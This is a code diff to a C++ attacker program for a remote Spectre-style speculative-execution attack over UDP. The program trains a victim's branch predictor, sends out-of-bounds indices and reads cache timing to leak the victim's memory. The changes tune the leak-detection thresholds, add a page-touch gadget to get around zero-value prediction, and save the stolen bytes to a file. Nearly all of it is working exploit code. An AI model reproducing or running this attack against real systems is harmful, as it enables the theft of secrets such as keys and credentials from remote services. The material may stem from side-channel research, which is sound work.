@@ -13,6 +13,7 @@
 
 // C++ Includes:
 #include <iostream>
+#include <fstream>
 #include <string>
 #include <thread>
 #include <mutex>
@@ -55,6 +56,8 @@ uint64_t target_len;      // Number of bytes to attempt to read at offset
 // [Optional] Relevant virtual addresses for attacker's convenience:
 uint64_t target_array1_va;   // VM Address of victim's array (e.g. array1[])
 uint64_t target_va;          // VM Address of target in victim
+
+std::string secret;   // Bucket for stolen secret/s...
 
 
 /********************************************************************
@@ -376,7 +379,7 @@ void send_worker(uint16_t port) {
 
   constexpr size_t MIN_MEASUREMENTS = 64;
   size_t measurements = MIN_MEASUREMENTS;
-  std::string secret(target_len, 0);
+  secret.resize(target_len);
 
   // Initialize target x to send to victim:
   msg m = {};
@@ -561,12 +564,12 @@ inline void speculate(SocketUDP& s, size_t malicious_x) {
 }
 
 
-inline void touch_page(SocketUDP& s, size_t malicious_x) {
+inline void touch_page(SocketUDP& s, size_t x) {
   // Send a single request with a malicious request:
   // Initialize target x to send to victim:
   msg m = {};
-  m.x = malicious_x;
-  m.fn = FN_TOUCH_PAGE;
+  m.x = x;
+  m.fn = FN_TOUCH_SECRET;
 
   // Send a burst of 5 training (valid) requests:
   auto bytes = s.send(&m, sizeof(m));
@@ -585,7 +588,7 @@ void send_worker_v2(uint16_t port) {
   std::cout << "["<<port<<"] - Sender worker thread listening." << std::endl;
 
   size_t measurements = MIN_MEASUREMENTS;
-  std::string secret(target_len, 0);
+  secret.resize(target_len);
 
   constexpr size_t TRAINING_X_MIN = 0;
   constexpr size_t TRAINING_X_MAX = 16;  // dependant on victim...
@@ -595,6 +598,8 @@ void send_worker_v2(uint16_t port) {
 
   size_t tries = 0;
   for (;;) {
+    const auto secret_idx = malicious_x - target_x_offset;
+
     // Timeseries intialization:
     // - reservation avoids memory allocation during side-channel anaylsis.
     hit_ts.resize(measurements); // Pre-allocate measurement space on heap!
@@ -615,12 +620,12 @@ void send_worker_v2(uint16_t port) {
       // Send request to victim:
       burst_train(s, training_x); // Critical to allow speculation!
       speculate(s, malicious_x);
-//      std::this_thread::yield();  // yield one sheduler tick (~100 us)
-//      std::this_thread::sleep_for(std::chrono::nanoseconds(10));
 
       // Wait some amount of time (or for server reply -- but may be too slow):
-//      std::this_thread::sleep_for(std::chrono::microseconds(100));
 //      const auto INITIAL_DELAY = std::chrono::microseconds(5);
+//      std::this_thread::sleep_for(INITIAL_DELAY);
+//      std::this_thread::sleep_for(std::chrono::nanoseconds(10));
+//      std::this_thread::yield();  // yield one sheduler tick (~100 us)
 
       // Measure speculative execution's impact on cache:
       // - measure after a predefined delay (or after event e.g. packet recv.)
@@ -707,10 +712,10 @@ void send_worker_v2(uint16_t port) {
     // Is there only one contender?  (picked min threshold 4, out of a hat)
     bool single_contender = sum == best && sum >= 4;
     // Is there a majority leader?  (picked signal threshold 2x, out of a hat)
-    bool significant = best >= (second/2) && sum >= 16;
+    bool significant = best >= (second/2) && sum >= 64;
     // Are we suspicious of Intel's Zero-value predicition on minor page fault?
     bool zero_value_prediciton = (counts_idx[0] == 0) &&
-                                 !(sum == best && sum >= 2*MIN_MEASUREMENTS);
+                                 (sum < 2*MIN_MEASUREMENTS);
 
     // Dynamic confidence adjustment:
     bool confident = single_contender || significant;
@@ -718,17 +723,17 @@ void send_worker_v2(uint16_t port) {
     // Special Case: handle a potential minor page fault:
     if (zero_value_prediciton) {
       // Force a TLB hit by triggering a touch page gadget:
-      touch_page(s, malicious_x);   // Critical to prevent zero-value prediction!
+      touch_page(s, secret_idx);   // Critical to prevent zero-value prediction!
 
       // Expect confirmation of gadget from victim (optional):
       msg& m = reinterpret_cast<msg&>(buf);
       auto bytes = s.recv(buf, sizeof(buf));
-      if (bytes != sizeof(msg) || m.x != malicious_x || m.fn != FN_TOUCH_PAGE) {
+      if (bytes != sizeof(msg) || m.x != secret_idx || m.fn != FN_TOUCH_SECRET) {
         std::cerr << "Unexpected touch confirmation..." << std::endl;
       }
 
-      // Retry, doubling the number of measurments:
-      measurements *= 2;
+      // Retry, quadruple the number of measurments:
+      measurements *= 4;
     }
     else if (!confident) {
       // Retry, doubling the number of measurments:
@@ -737,7 +742,7 @@ void send_worker_v2(uint16_t port) {
     else {
       // Pick the byte with the highest hits:
       auto idx = counts_idx.at(0);  // byte value from 0 to 255
-      secret.at(malicious_x - target_x_offset) = idx;
+      secret.at(secret_idx) = idx;
 
       // Output statistics:
       float confidence = (float(best) / float(sum)) * 100;
@@ -761,7 +766,7 @@ void send_worker_v2(uint16_t port) {
         break;  // break out of forever loop.
       }
     }
-  }
+  }   // Forever (until finished with secret)
 
   // Print out secret:
   std::cout << "Finished reading " << target_len
@@ -791,7 +796,7 @@ int main(int argc, char* const argv[]) {
     std::cout << "Calculated target_offset: " << target_x_offset << '\n';
   }
   else {
-    std::cout << "Supplied target_offset:" << target_x_offset << '\n';
+    std::cout << "Supplied target_offset :" << target_x_offset << '\n';
   }
   std::cout << "Reading " << target_len << " bytes."<< std::endl;
 
@@ -810,6 +815,17 @@ int main(int argc, char* const argv[]) {
 //    std::cerr << "Error calling pthread_setaffinity_np: " << rc << "\n";
 //  }
   t.join(); // wait until exits for now...
+
+
+  // Save discovered secret to file:
+  assert (secret.size() > 0);
+  std::ofstream f;
+  f.open("secret.out", std::ios::out);
+  if (!f.is_open()) {
+    std::cerr << "Error opening file for writing...";
+  }
+  f << secret;
+  f.close();
 
   return EXIT_SUCCESS;
 }
